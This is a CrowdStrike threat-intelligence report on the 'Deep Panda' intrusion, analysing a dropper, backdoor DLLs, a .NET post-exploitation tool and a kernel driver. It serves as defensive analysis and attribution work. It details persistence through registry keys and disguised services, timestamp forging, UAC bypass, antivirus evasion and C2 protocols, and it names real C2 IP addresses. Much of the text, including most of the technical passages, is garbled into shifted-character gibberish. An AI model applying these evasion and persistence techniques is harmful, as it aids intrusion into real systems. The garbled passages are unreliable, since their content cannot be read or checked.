






































DEEP PANDA
INTELLIGENCE TEAM REPORT VER. 1.0 



DEEP PANDA

1 EXECUTIVE SUMMARY 21

1 TECHNICAL ANALYSIS 3

Dropper Sample (MD5: 14c04f88dc97aef3e9b516ef208a2bf5) 3
Backdoor DLL Sample (MD5: 47619fca20895abc83807321cbb80a3d) 5
 Initial C2 Phone Home Beacon 6
 Network Protocol and Implementation 7
 Backdoor Functionality, Supported Commands 7
Post Exploitation Tool Sample (MD5:  2dce7fc3f52a692d8a84a0c182519133) 8
 Network Protocol and Implementation 9
Backdoor DLL Sample (MD5:  de7500fc1065a081180841f32f06a537) 10
 C2 Communication Mechanisms 12
 C2 Command Invocation 13
Kernel Driver Sample (MD5: dae6b9b3b8e39b08b10a51a6457444d8) 14
 Entrypoint 14

 
Network Signatures 18
File System Artifacts 19
Registry Artifacts 19
Other Artifacts 19

2

1 MITIGATION / REMEDIATION 183

1 ATTRIBUTION 20

 

4

1 CONCLUSION 25

 Dropper/Implant #1 25
 Post Exploitation Tool 25
 Implant #2 26
 Backdoor DLL 26
 System Driver 26

5

1 APPENDIX 27

 Appendix A: Command Line Options for Post Exploitation Tool Sample                                                 27
 Appendix B: Algorithm for computing machine ID 28
 Appendix C: Remote Commands Supported by .NET Backdoor Post Exploitation Tool Sample 28
 Appendix D: Raw bytes of example Authentication packet. 30
 Appendix E: Initialization of KEY and IV for AES 30
 Appendix F: Command & Control Servers 31
 Appendix G: Edward Sun’s kernel network hook code 32
 Appendix H: Command and Control MD5 Correlation 41

6





,Q�ODWH�'HFHPEHU�������&URZG6WULNH��,QF��UHFHLYHG�WKUHH�ELQDU\�H[HFXWDEOH�¿OHV�WKDW�ZHUH�VXVSHFWHG�RI�
KDYLQJ�EHHQ�LQYROYHG�LQ�D�VRSKLVWLFDWHG�DWWDFN�DJDLQVW�D�ODUJH�)RUWXQH�����FRPSDQ\���7KH�¿OHV�ZHUH�
DQDO\]HG�WR�XQGHUVWDQG�¿UVW�LI�WKH\�ZHUH�LQ�IDFW�PDOLFLRXV��DQG�WKH�OHYHO�RI�VRSKLVWLFDWLRQ�RI�WKH�VDPSOHV���

The samples were clearly malicious and varied in sophistication.   All three samples provided remote access 
to the attacker, via two Command and Control (C2) servers.  One sample is typical of what is commonly 
referred to as a ‘dropper’ because its primary purpose is to write a malicious component to disk and connect 
it to the targeted hosts operating system.  The malicious component in this case is what is commonly re-
ferred to as a Remote Access Tool (RAT), this RAT is manifested as a Dynamic Link Library (DLL) installed 
as a service.  The second sample analyzed is a dual use tool that can function both as a post exploitation 
tool used to infect other systems, download additional tools, remove log data, and itself be used as a 
backdoor.  The third sample was a sophisticated implant that in addition to having multiple communication 
capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can 
hide aspects of the tool from user-mode tools.  This third component is likely used for long-term 
implantation and intelligence gathering.  Some AV engines occasionally identify this sample as Derusbi 
Trojan.  CrowdStrike Intelligence Team has seen Trojans from 8 different builder variants of this RAT, 
including 64-bit versions, used in targeted attacks in 2011 against Defense, Energy/Power, and Chemical 
Industries in US and Japan. 

$OO�RI�WKHVH�VDPSOHV�UHÀHFW�FRPPRQ�WRROPDUNV�DQG�WUDGHFUDIW�FRQVLVWHQW�ZLWK�&KLQHVH�EDVHG�DFWRUV�ZKR�
target various strategic interests of the United States including High Tech/Heavy Industry, 
Non-Governmental Organizations (NGOs), State/Federal Government, Defense Industrial Base (DIB), and 
organizations with vast economic interests.  This report contains an in-depth technical analysis of the 
samples, detection/remediation/mitigation information, attribution intelligence, and a conclusion aimed at 
providing the reader with a synopsis of the report.

 

EXECUTIVE SUMMARY

S  E  N  S  I  T  I  V E 2CROWDSTRIKE

DEEP PANDA





The executable 14c04f88dc97aef3e9b516ef208a2bf5 is commonly referred to as a ‘dropper’, which is 
designed with the purpose of extracting from itself a malicious payload and to initialize and install it into a 
targeted system.  In this case, the malicious payload is a Dynamic-Link Library (DLL), which enables an 
attacker to have full control of the system.  This code appears to have been compiled on Wednesday May 
4th, 2011 at 11:04:24 A.M. UTC (equivalent to early evening time in China).  Note that the timestamp is in 
87&��KRZHYHU�WKH�UHODWLYH�WLPH�RI�GD\�LQ�&KLQD�LV�SURYLGHG�IRU�WKH�EHQH¿W�RI�WKH�UHDGHU��7KH�VDPSOH�¿UVW�
resolves several library functions provided by Microsoft using the LoadLibrary() and GetProcAddress() 
Application Programming Interfaces (APIs). The imported function names are not encrypted; however, the 
function name is minutely obfuscated by a simple single character substitution:

The dropper invokes the SHGetSpecialFolderPath() API supplying a Constant Special Item ID List (CSIDL) 
of ‘CSIDL_COMMON_DOCUMENTS’ to identify the destination folder for the malicious DLL payload.  The 
&6,'/�LQ�WKLV�FDVH�SRLQWV�WR��³7KH�¿OH�V\VWHP�GLUHFWRU\�WKDW�FRQWDLQV�GRFXPHQWV�WKDW�DUH�FRPPRQ�WR�DOO�
users. A typical path is C:\Documents and Settings\All Users\Documents.”

7KH�GURSSHU�DWWHPSWV�WR�ZULWH�WKH�PDOLFLRXV�SD\ORDG�WR�RQH�RI�WKH�IROORZLQJ�¿OH�QDPHV��XVLQJ�WKH�¿UVW�
available name in this set:

1. infoadmn.dll
2. infoctrs.dll
3. infocardapi.dll

7KH�GURSSHU�VHWV�WKH�FUHDWLRQ�DQG�ODVW�ZULWWHQ�WLPHVWDPS�RI�WKH�QHZO\�FUHDWHG�¿OH�WR�WKH�GDWH������������
����������WKLV�DOORZV�WKH�QHZO\�FUHDWHG�PDOLFLRXV�'//�WR�EOHQG�LQ�ZLWK�RWKHU�V\VWHP�¿OHV���7KLV�LV�PHDQW�WR�
SUHYHQW�LGHQWL¿FDWLRQ�GXULQJ�GLVN�IRUHQVLFV�XVLQJ�D�FRPPRQ�LQYHVWLJDWLYH�WHFKQLTXH�FDOOHG�D�IRUHQVLF�
DQDO\VLV�WLPHOLQH���7KLV�GDWH�LV�VSHFL¿HG�LQ�WKH�GURSSHU�FRGH�DQG�GRHV�QRW�FKDQJH�DFURVV�PXOWLSOH�LQIHFWLRQV�

7KH�PDOLFLRXV�'//�¿OH�WKDW�LV�GURSSHG�LV�KLGGHQ�LQ�D�UHVRXUFH�RI�WKH�GURSSHU�ELQDU\���7KLV�LV�D�UHODWLYHO\�
FRPPRQ�WHFKQLTXH�XVHG�E\�PDOZDUH�GURSSHU�¿OHV�WR�RSWLPL]H�WKH�QXPEHU�RI�¿OHV�UHTXLUHG�WR�LQIHFW�D�
PDFKLQH���7KH�UHVRXUFH�ODQJXDJH�RI�WKH�PDOLFLRXV�'//�LV�VHW�WR�³&KLQHVH��6LPSOL¿HG�´��WKLV�LV�D�FRPSLOHU�
artifact which indicates the language setting on the compiler used by the person who built the binary was 
VHW�WR�&KLQHVH��6LPSOL¿HG�´�DW�WKH�WLPH�WKH�GURSSHU�ZDV�FRPSLOHG���7KH�µ0=¶�KHDGHU�ZKLFK�GHQRWHV�D�ELQDU\�
H[HFXWDEOH�¿OH�RI

TECHNICAL ANALYSIS

Dropper Sample (MD5: 14c04f88dc97aef3e9b516ef208a2bf5)

S  E  N  S  I  T  I  V E 3CROWDSTRIKE

  //Obfuscation of GetTempPathA() API function call

  strcpy((char *)ProcName, “2etTempPathA”);

  ProcName[0] = ‘G’;

DEEP PANDA



WKH�GURSSHG�'//�LV�LQLWLDOO\�REIXVFDWHG���:KHQ�WKH�GURSSHU�ZULWHV�WKH�¿OH�WR�GLVN��WKH�¿UVW�E\WH�RI�WKH�¿OH�LV�µ=¶�
ZKLFK�SUHYHQWV�WKH�¿OH�IURP�H[HFXWLQJ�RU�EHLQJ�GHWHFWHG�DV�DQ�H[HFXWDEOH�E\�PDQ\�GHIHQVLYH�WRROV���
7KH�GURSSHU�VXEVHTXHQWO\�RSHQV�WKH�GURSSHG�¿OH�DQG�FRUUHFWV�WKH�KHDGHU�E\�ZULWLQJ�WKH�µ0¶�RYHU�WKH�¿UVW�
E\WH��DOORZLQJ�WKH�¿OH�WR�EH�H[HFXWHG�

$�VXEURXWLQH�WR�GHFRPSUHVV�WKH�GURSSHG�¿OH�LV�SUHVHQW�DV�µGHDG�FRGH¶��FRGH�WKDW�LV�QRW�XVHG��LQ�WKH�
ELQDU\��7KLV�VXEURXWLQH�ZLOO�EH�LQYRNHG�RQ�WKH�DOUHDG\�FORVHG�¿OH�KDQGOH�RI�WKH�GURSSHG�¿OH�LQ�WKH�SUHVHQW�
code version. Since the dropped resource is not compressed, the routine fails.  This indicates a low 
VRSKLVWLFDWLRQ�PRGL¿FDWLRQ�WR�WKH�RULJLQDO�GURSSHU�FRGH�WR�PDNH�LW�ZRUN�ZLWK�DQ�XQFRPSUHVVHG�UHVRXUFH���

7KH�¿QDO�VWHS�WKH�GURSSHU�SHUIRUPV�LV�WR�ORDG�WKH�GURSSHG�'//�LQWR�LWV�RZQ�SURFHVV�VSDFH��LW�WKHQ�UHVROYHV�
WKH�H[SRUW�µ2SHQ,1)23HUIRUPDQFH'DWD¶�IURP�WKH�'//�DQG�LQYRNHV�LW�ZLWK�WKH�GURSSHG�'//¶V�¿OHQDPH�DV�
parameter. This export then implements the actual install logic to maintain persistence and invoke the main 
routine.

The dropper binary contains an icon resource that resembles the ‘Google Chrome’ browser icon, the re-
VRXUFH�ODQJXDJH�LV�VHW�WR�³&KLQHVH��6LPSOL¿HG�´��ZKLFK�LV�FRQVLVWHQW�ZLWK�WKH�EXLOGHU�RI�WKH�WRRO�KDYLQJ�WKHLU�
systems language set to Chinese.  The use of the Chrome icon may indicate a possible attempt to socially 
HQJLQHHU�WKH�LQWHQGHG�YLFWLP�LQWR�WKLQNLQJ�WKH�GURSSHU�ZDV�D�OHJLWLPDWH�¿OH�DVVRFLDWHG�ZLWK�*RRJOH��

S  E  N  S  I  T  I  V E 4CROWDSTRIKE

DEEP PANDA



7KLV�VDPSOH�LV�D�µEDFNGRRU¶�ZKLFK�LV�WKH�'//�GURSSHG�E\�WKH�GURSSHU�VDPSOH�¿OH�ZLWK�DQ�0'��RI�
14c04f88dc97aef3e9b516ef208a2bf5. This code appears to have been compiled on Wednesday May 4th, 
2011 at 10:48:19 A.M. UTC (equivalent to early evening time in China).  It is instantiated when it is mapped 
LQWR�WKH�SURFHVV�VSDFH�RI�LWV�GURSSHU�¿OH��DQG�LWV¶�H[SRUW�QDPHG�µ2SHQ,1)23HUIRUPDQFH'DWD¶�LV�FDOOHG���
7KLV�H[SRUW�¿UVW�DWWHPSWV�WR�VWRS�D�VHUYLFH�FDOOHG�³PVXSGDWH�´�ZKLFK�LV�QRW�D�NQRZQ�0LFURVRIW�:LQGRZV�
service despite the appearance. If the service is present, the malware replaces its previous instances or 
versions of this backdoor. After attempting to disable the existing service, the malware tries to install itself as 
a service with that same name. During installation, the sample attempts to use documented APIs such as 
OpenSCManager() and CreateService() to initialize itself as a persistent Windows service. As a 
precaution, the sample writes settings directly to the Windows Registry to accomplish the same goal if 
installing the service with the documented APIs fails.  The registry change creates the following key: 

HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\msupdate\\Parameters

Following this, the subroutine will set the value of the ‘ServiceDLL’ to the module handle of the DLL.

The next key to be changed is: 
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost, which will have 
the ‘msupdate’ key set to ‘msupdate’.

The export ‘CollectW3PerfData’ is registered as the main function of the DLL. If the installation of the new 
service is successful, the sample then starts the new service and exits. If the installation fails, the sample 
VSDZQV�D�QHZ�SURFHVV�XVLQJ�UXQGOO���H[H��WKLV�H[HFXWDEOH�ZLOO�LQVWDQWLDWH�WKH�'//�DQG�FDQ�FDOO�D�VSHFL¿F�
exported function.  In the case of installation failure, rundll32.exe calls the main functions export 
µ&ROOHFW:�3HUI'DWD¶���7KH�UXQGOO���H[H�H[HFXWDEOH�LV�LQVWDQWLDWHG�ZLWK�D�QHZ�18//�6HFXULW\�,GHQWL¿HU��6,'��
�6��������ZLWK�SHUPLVVLRQV�VHW�WR�JUDQW�DOO�DFFHVV�WR�WKH�¿OH��7KLV�DOORZV�DQ\�XVHU�WR�KDYH�FRPSOHWH�FRQWURO�
over the machine, as rundll32.exe is frequently launched by tasks such as changing the time, wallpaper, 
or other system settings. This means that after cleaning up the components dropped by the malware, the 
system remains vulnerable to local attacks by simply overwriting the legitimate rundll32.exe executable with 
a malicious version and await it’s automatic execution by the Operating System.

7KH�PDLQ�HQWU\�SRLQW�WR�WKH�'//�LV�QDPHG�µ&ROOHFW:�3HUI'DWD�¶�DV�LW�¿UVW�FUHDWHV�DQG�GLVSOD\V�D�IDNH�
Window with class “NOD32_%d” where %d is replaced with a pseudo-random number. This may be an 
attempt to fool some automated dynamic analysis or anti-malware software into believing this is the 
OHJLWLPDWH�(6(7�$9�VRIWZDUH��7KH�ZLQGRZ�LV�KRZHYHU�QRW�YLVLEOH�DQG�LPSOHPHQWV�QR�VSHFL¿F�IXQFWLRQDOLW\�

After creating this window, the routine starts the main thread that eventually initiates calling out to the 
Command and Control (C2). In order to accomplish this task, the newly 

S  E  N  S  I  T  I  V E 5CROWDSTRIKE

Backdoor DLL Sample (MD5: 47619fca20895abc83807321cbb80a3d) 

DEEP PANDA



created thread initializes networking APIs using WSAStartup() and resolves some other APIs dynamically 
using LoadLibrary() and GetProcAddress(). Once the proper API’s have been resolved, the sample then 
assigns a NULL SID to the rundll32.exe executable and sets the current process’ Window Station to 
“winsta0”, which enables the sample to access the real user’s desktop if started as service.

The communication to the C2 is handled by a while() loop, with each successive connection attempt 
causing the loop to  invoke the Windows Sleep() API for a  time interval of 2 seconds, exponentially 
increasing in length up to 1024 seconds (17 minutes) and then restarting back to 2 seconds.

7KH�&��ORFDWLRQ�LQ�WKLV�VDPSOH�LV�VWDWLFDOO\�GH¿QHG�DV���������������0DOD\VLD��7PQHW��7HOHNRP�0DOD\VLD�
%KG���:KLOH�WKHUH�LV�µGHDG�FRGH¶�WKDW�ZLOO�GRZQORDG�WKH�&��ORFDWLRQ�IURP�DQ�+773�85/�WKDW�FRXOG�EH�GH¿QHG�
in the binary, using the User-Agent string “Google”, this code is not activated due to the format of the stat-
LFDOO\�GH¿QHG�&��ORFDWLRQ�XVLQJ�DQ�,3�DGGUHVV��7KXV�WKH�VDPSOH�ZLOO�RQO\�DWWHPSW�WR�FRQQHFW�GLUHFWO\�XVLQJ�
a raw socket to the C2 located at 1.9.5.38:443. This indicates the use of a ‘boiler plate code’ or a builder 
software package that automates the creation of the malicious sample.

The malicious sample sends an initial beacon to the C2 that includes the following information:

Ɣ��7KH�FRPSXWHU�QDPH�DV�REWDLQHG�ZLWK�WKH�*HW&RPSXWHU1DPH���$3,
Ɣ��7KH�XVHUQDPH�RI�WKH�FXUUHQW�5HPRWH�'HVNWRS�VHVVLRQ�LI�FXUUHQWO\�EHLQJ�H[HFXWHG�LQ�D�5HPRWH�
    Desktop session or “none” otherwise.
Ɣ��7KH�FXUUHQWO\�ORJJHG�LQ�XVHUQDPH�LQ�WKH�V\VWHP�DV�REWDLQHG�ZLWK�WKH�*HW8VHU1DPH���$3,
Ɣ��7KH�PDFKLQH¶V�XSWLPH
Ɣ��7KH�:LQGRZV�YHUVLRQ�DQG�6HUYLFH�3DFN�OHYHO
Ɣ��7KH�DPRXQW�RI�DYDLODEOH�3K\VLFDO�0HPRU\�LQ�0%
Ɣ��&XUUHQW�5HPRWH�'HVNWRS�VHVVLRQV�DV�HQXPHUDWHG�ZLWK�:76(QXPHUDWH6HVVLRQV
Ɣ��$�VWULQJ�LGHQWL¿HU�VWDWLFDOO\�VHW�WR�³)%,��������´

7KH�EHDFRQ�LV�HQFU\SWHG�XVLQJ�DQ�;25�$''�ORRS�XVLQJ�WKH�VWDWLFDOO\�GH¿QHG�NH\��[�&�DQG�VHQW�WR�WKH�&����

The following python function can be used to decode the beacon stings:

Initial C2 Phone Home Beacon

S  E  N  S  I  T  I  V E 6CROWDSTRIKE

def decode(crypted):

decoded=””

  for x in crypted:

    decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)

  return decoded

DEEP PANDA



After sending the initial beacon, the routine loops receiving incoming commands and executes them in 
sequence.  When a connection can successfully be established to the C2 server, the sleep timer is reset to 
two seconds for the next attempt. 

The network protocol used by this sample resembles a ‘Type-Length-Value’ layout in both directions. 
Each 16 byte request header consists of:

����$�QXPHULFDO���E\WH��VHHPLQJO\��OLWWOH�HQGLDQ�FRPPDQG�LGHQWL¿HU�
2.  A 4-byte little-endian payload length
3.  8 bytes remaining are a request header that is typically uninitialized and only used by some 
     commands instead of the arbitrary length payload

=HUR�RU�PRUH�RI�VSHFL¿HG�E\WHV�RI�DGGLWLRQDO�SD\ORDG�WKHQ�IROORZV�WKH�KHDGHU�

7KLV�LQERXQG�SD\ORDG�LV�UHFHLYHG�XQFRQGLWLRQDOO\�DQG�UHJDUGOHVV�RI�FRPPDQG�W\SH�LQWR�D�¿[HG�VL]H�VWDFN�
buffer of 408 bytes size. Providing additional payload of any larger size will result in a trivial exploitable stack 
EXIIHU�RYHUÀRZ�WKDW�DOORZV�DUELWUDU\�FRGH�H[HFXWLRQ�GXH�WR�WKH�DEVHQFH�RI�DQ\�VHFXULW\�IHDWXUHV��+RZHYHU��
exploitation of this vulnerability is unnecessary due to the already available unauthenticated command 
execution capabilities of this backdoor.

Certain commands initiate a second connection to the C2 in a separate thread using the same network 
SURWRFRO�EXW�SURYLGLQJ�D�GLIIHUHQW�UHTXHVW�FRPPDQG�LGHQWL¿HU�WKDQ�IRU�WKH�LQLWLDO�EHDFRQ�

The primary aim of this backdoor is remote desktop control functionality comparable to VNC or Remote 
Desktop over a custom protocol. It allows the adversary to view the main desktop graphically and 
control the keyboard and mouse. This remote control functionality is implemented as separate messages 
IRU�PRXVH�FOLFNV��SUHVVHG�NH\V��HWF��XVLQJ�FRPPDQG�LGHQWL¿HUV��[���������WR��[����������7KH�FRPPDQG�
0x22000001 initiates continuous transmission of screen captures to the C2.  The screen captures are 
created using a series of Microsoft Windows Graphic Device Interface (GDI) API calls culminating in a call to 
GetDIBits().

Command 0x20000001 exits the backdoor and 0x20000000 is issued to completely remove the backdoor 
from the system.

Network Protocol and Implementation

Backdoor Functionality, Supported Commands

S  E  N  S  I  T  I  V E 7CROWDSTRIKE

DEEP PANDA



When command 0x23000004 is received, a temporary new user “_DomainUser_” with password “Dom4!nU-
serP4ss” is created and added to the local Administrators group. The backdoor is then started under that 
account and the user is deleted. It would appear this technique is meant to obfuscate the activities of the 
malicious sample by masking the process creator’s user name to appear to be a generic domain user. Note 
that such an account does not normally exist in an Active Directory environment.

Additionally, the primary C2 connection allows for requests to start additional connections to the C2 imple-
menting the following functionality:

Ɣ��$�SURFHVV�FRQWURO�FRQQHFWLRQ�LQLWLDWHG�E\�FRPPDQG��[���������WKDW�DOORZV�IRU�HQXPHUDWLRQ�DQG��
    killing of running processes
Ɣ��$�SLSHG�FRPPDQG�OLQH�SURFHVV�FRQQHFWLRQ�WKDW�DOORZV�FRPPXQLFDWLRQ�ZLWK�VWDQGDUG�LQSXW�DQG
    output of arbitrary executables; initiated by command 0x23000000 
Ɣ��$�¿OH�EURZVHU�FRQQHFWLRQ�LQLWLDWHG�E\�FRPPDQG��[���������WKDW�DOORZV�IRU

ż� /LVWLQJ�GLUHFWRU\�FRQWHQWV
ż� &RS\LQJ��GHOHWLQJ�DQG�PRYLQJ�¿OHV
ż� 2SHQLQJ�¿OHV�XVLQJ�WKH�6KHOO([HFXWH���$3,
ż� 'RZQORDGLQJ�DQG�XSORDGLQJ�¿OHV�IURP���WR�WKH�&�

Ɣ��$�5HPRWH�'HVNWRS�VHVVLRQ�HQXPHUDWRU�LQLWLDWHG�E\�FRPPDQG��[��������

This sample is typical of a post exploitation tool; it is written in .NET 2.0. This code appears to have been 
compiled on Thursday May 26th, 2011 at 10:21:44 A.M. UTC (early evening time in China). The backdoor 
functionality can be instantiated either directly from the command line or through commands issued over a 
network based protocol via the C2. If no arguments are given, a connection to the C2 is initiated to the stati-
FDOO\�GH¿QHG�,3�DGGUHVV���7KH�FRPPDQG�OLQH�RSWLRQV�VXSSRUW�SRVW�H[SORLWDWLRQ�FDSDELOLWLHV�VXFK�DV�FKDQJLQJ�
¿OH�WLPHVWDPSV��IRUHQVLF�PLWLJDWLRQ��SULYLOHJH�HVFDODWLRQ��ODXQFKLQJ�WKH�H[HFXWDEOH��DQG�VSHFLI\LQJ�D�VSHFL¿F�
C2.

2QH�LQWHUHVWLQJ�FRPPDQG�OLQH�RSWLRQ�DOORZV�WKH�EDFNGRRU�WR�¿OWHU�WKH�FRQWHQWV�RI�VSHFL¿HG�¿OHV�WR�UHPRYH�
FRQWHQW�XVLQJ�D�UHJXODU�H[SUHVVLRQ��UHJH[����7KLV�FRPPDQG�WKHQ�PRGL¿HV�WKH�FUHDWLRQ��PRGL¿FDWLRQ��DQG�ODVW�
DFFHVV�WLPHVWDPSV�RI�WKH�PRGL¿HG�¿OH�WR�FRQFHDO�WKH�FRQWHQW�PRGL¿FDWLRQV���$�GHWDLOHG�OLVWLQJ�RI�FRPPDQG�
line arguments can be viewed in Appendix A.  This activity is generally associated with log cleaning to com-
plicate a forensic investigation.

The sample contains an embedded IP address for C2 that is stored in an encrypted format as a string re-
source:

W� �³��P-T<K-.FK-X7PR6=N-.D��&�������%���)�����)���)����%&&��$$$�����´

Post Exploitation Tool Sample (MD5:  2dce7fc3f52a692d8a84a0c182519133)

S  E  N  S  I  T  I  V E 8CROWDSTRIKE

DEEP PANDA



S  E  N  S  I  T  I  V E 9CROWDSTRIKE

7KH�¿UVW�WZR�E\WHV�RI�WKLV�VWULQJ�UHSUHVHQW�WKH�EDVH����OHQJWK�RI�WKH�HQFU\SWHG�VWULQJ��LQ�WKLV�FDVH��³�[���´�
)ROORZLQJ�WKLV�LV�D�EDVH���HQFRGHG�VWULQJ�RI�WKH�VSHFL¿HG�OHQJWK��2QFH�WKLV�VWULQJ�KDV�EHHQ�GHFRGHG�
XVLQJ�EDVH����WKH�UHVXOW�LV�WKHQ�;25¶G�ZLWK�WKH�¿[HG�YDOXH�RI��[$$�\LHOGLQJ�WKH�GHFRGHG�,3�$GGUHVV�
202.86.190.3:80 (Hong Kong: TeleOne(HK) Limited).

There are three components to the protocol:

Authentication is accomplished using a 32 byte packet, this packet consists of: 

����$�IRXU�E\WH�µPDJLF¶�NH\�ZKLFK�LQ�WKLV�VDPSOH�LV�VWDWLFDOO\�GH¿QHG�DV��[��������
2.  A four byte random number generated by the rand() function
3.  The machine ID comprised of an obfuscated combination of the Machine name and hard drive
     serial number. The algorithm for generating this is in Appendix B
4.  The communication protocol version number, which in this sample is 0x2
5.  The version of the malicious sample, in this case it is 841

An example authentication packet sent to the C2 is located in Appendix E

$IWHU�VHQGLQJ�WKH�LQLWLDO�DXWKHQWLFDWLRQ�SDFNHW��WKH�VDPSOH�YHUL¿HV�WKDW�WKH�¿UVW�IRXU�E\WHV�RI�WKH�UHVSRQVH�LV�
HTXDO�WR�D�VWDWLFDOO\�GH¿QHG�YDOXH��LQ�WKLV�VDPSOH�WKH�YDOXH�LV���[����������,Q�DGGLWLRQ��DQ���E\WH�NH\�LV�VHQW�
to the client which is then RC4 encrypted using the random number generated in step 2 from above as the 
password. This value is then transformed using a simple algorithm in Appendix F into a 32 byte array. The 
¿UVW����E\WHV�RI�WKLV�DUUD\�DUH�WKHQ�XVHG�DV�WKH�.(<�DQG�WKH�VHFRQG����E\WHV�DUH�XVHG�DV�WKH�,9�IRU�VHWWLQJ�
up AES encryption which is then used to encrypt and decrypt any further communications.

Network Protocol and Implementation

DEEP PANDA



Beacon, this is typical of this type of malicious sample, it allows the operator to separate various infected 
hosts in a targeted campaign.  The beacon for this sample is formatted as XML and consists of: 

Ɣ��7KH�LQIHFWHG�PDFKLQH�QDPH
Ɣ��&XUUHQW�WLPH�]RQH
Ɣ��:LQGRZV�YHUVLRQ
Ɣ��/RFDO�WLPH�GDWH�RI�WKH�LQIHFWHG�PDFKLQH
Ɣ��&��SURWRFRO�YHUVLRQ�

An example of an unencrypted beacon:

<?xml version=”1.0” encoding=”utf-16”?>
<BasicInfo xmlns:xsi=”http://www.w3.org/2001/XMLSchema-instance” xmlns:xsd=”http://www.
w3.org/2001/XMLSchema”>
  <HostName> Infected System Hostname</HostName>
  <int_0>-8</int_0>
  <osVersion>Microsoft Windows NT 6.1.7601 Service Pack 1</osVersion>
  <string_0>12/27/2011 16:34:36</string_0>
  <Version>2</Version>
</BasicInfo>

Command handling loop, this is a loop structure that will process and execute commands sent by the C2.  
The malware sends and receives a heartbeat/keepalive packet every 2 minutes.  The command format is 
derived from a structure consisting of:

7KHVH�¿HOGV�DUH�UHFHLYHG�DV�D�VHTXHQFH�RI�VHULDOL]HG��1(7�REMHFWV�LQ�WKH�RUGHU�VSHFL¿HG��$�GHWDLOHG�
description of the possible values for commands is in Appendix D. It is important to note that the order in 
ZKLFK�WKH�DSSOLFDWLRQ�GH¿QHV�WKHP�LV�QRW�WKH�VDPH�RUGHU�DV�WKH\�DSSHDU�WR�EH�FRPLQJ�RYHU�WKH�QHWZRUN��
([DPSOHV�RI�LPSOHPHQWHG�FRPPDQGV�LQFOXGH�GRZQORDG�DQG�XSORDG�¿OHV��LQVWDOOLQJ�QHZ��1(7�DVVHPEOLHV��
calling methods on those assemblies, connecting to new C2 servers and executing processes.
Backdoor DLL Sample (MD5:  de7500fc1065a081180841f32f06a537)

This sample is a sophisticated backdoor which implements several communications protocols and was 
GHYHORSHG�LQ�&�����7KLV�ELQDU\�LV�FRPSLOHG�ZLWK�WKH��*6�ÀDJ�XVLQJ�9LVXDO�6WXGLR�������HQDEOLQJ�VWDFN�EXIIHU�
RYHUÀRZ�GHWHFWLRQ��7KLV�FRGH�DSSHDUV�WR�KDYH�EHHQ�FRPSLOHG�RQ�6XQGD\�2FWREHU����������DW����������3�0��
UTC (late evening time in China). The code contains several Run Time Type Information (RTTI) artifacts that 
LQGLFDWH�PRVW�RI�WKH�&���FODVV�QDPHV�ZHUH�SUH¿[HG�ZLWK�WKH�VWULQJ�³3&&B´�LQ�WKH�RULJLQDO�VRXUFH�FRGH�

S  E  N  S  I  T  I  V E 10CROWDSTRIKE

Backdoor DLL Sample (MD5:  de7500fc1065a081180841f32f06a537)

DEEP PANDA



Variants of this Trojan are sometimes detected under the name ‘Derusbi’ by Microsoft, Trend, Sophos and 
Symantec AV engines.

This sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide 
an interactive command line shell to the C2.  It also is able to bypass User Account Control (UAC) to install 
itself by using the ‘sysprep.exe’ Microsoft Windows executable provided by the targeted system. The steps it 
takes to install itself onto a system are as follows:

1.  Copies itself to to %WINDIR%\system32\Msres<3 random characters>.ttf
����$IWHU�LW�FRSLHV�LWVHOI��LW�ZLOO�PRGLI\�WKH�FUHDWLRQ�WLPH��ODVW�DFFHVV�WLPH�DQG�ODVW�PRGL¿FDWLRQ�WLPH�WR
     the current system time when the copy was made but with the year changed to 2005.
����$GGV�LWVHOI�DV�D�VHUYLFH�QDPH�IURP�WKH�EDFNGRRU¶V�FRQ¿JXUDWLRQ�XQGHU�+.(<B/2&$/B
     MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service>” This defaults to “wuauserv”, 
�����WKH�OHJLWLPDWH�:LQGRZV�8SGDWH�VHUYLFH��LQ�WKH�JLYHQ�ELQDU\¶V�GHIDXOW�FRQ¿JXUDWLRQ�
4.  Adds itself to list of services started by ‘netsvc’ using the service name ‘helpsvc’.
5.  If McAfee AV is installed, creates a copy of regsvr32.exe named Update.exe and then schedules
     the copy to be deleted on reboot using the well documented MoveFileExA API.
6.  It then calls either the original or copy of regsvr32.exe with the parameters /s /u and the path to
     the copy of itself it made in Step 1. The /u parameter means “uninstall”, which calls 
     DllUnregisterServer, this is an unsophisticated method of DLL entry point obfuscation.
7.  DllUnregisterServer installs the driver and initiates the backdoor component.

7KH�VDPSOH�LV�FDSDEOH�RI�µGURSSLQJ¶�DQ�HPEHGGHG�HQFU\SWHG�NHUQHO�GULYHU���,I�WKH�SURFHVV�³=KX'RQJ)DQJ<X�
exe” is running (AntiVirus360 program from the Chinese ‘Quihoo 360 Technology Co., LTD’ 360 ), 
or the username of the DLL’s host process context is not ‘SYSTEM’, the driver is not written to disk.  Barring 
the two aforementioned conditions, the sample decrypts the kernel driver to:
 

“%sysdir%\Drivers\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys”

)ROORZLQJ�WKH�GHFU\SWLRQ�DQG�ZULWLQJ�RI�WKH�GULYHU�WR�GLVN��LW�LV�ORDGHG�XVLQJ�WKH�=Z/RDG'ULYHU���$3,��7KH�GULY-
HU�LV�HQFU\SWHG�ZLWK�D�VLPSOH�IRXU�E\WH�;25�NH\�YDOXH�RI��[�(���')���DIWHU�GHFU\SWLRQ�WKH�¿OH�KDV�WKH�0'��
hash of dae6b9b3b8e39b08b10a51a6457444d8.

7KH�PDOZDUH�FRQWDLQV�D�G\QDPLF�FRQ¿JXUDWLRQ�VWRUHG�LQ�WKH�5HJLVWU\�XQGHU

 “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Security”

DQG�ORDGV�D�GHIDXOW�FRQ¿JXUDWLRQ�HPEHGGHG�LQWR�WKH�ELQDU\�LI�VXFK�D�FRQ¿JXUDWLRQ�LV�QRW�IRXQG��7KH�ZD\�
WKLV�GHIDXOW�FRQ¿JXUDWLRQ�LV�ORDGHG�DQG�SDUVHG�LQGLFDWHV�WKDW�WKLV�PDOZDUH�KDV�EHHQ�EXLOW�ZLWK�D�µEXLOGHU¶�WKDW�
